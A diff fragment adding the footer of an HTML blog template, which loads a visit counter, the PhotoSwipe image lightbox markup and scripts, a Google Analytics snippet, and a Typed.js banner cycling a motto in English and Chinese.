+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
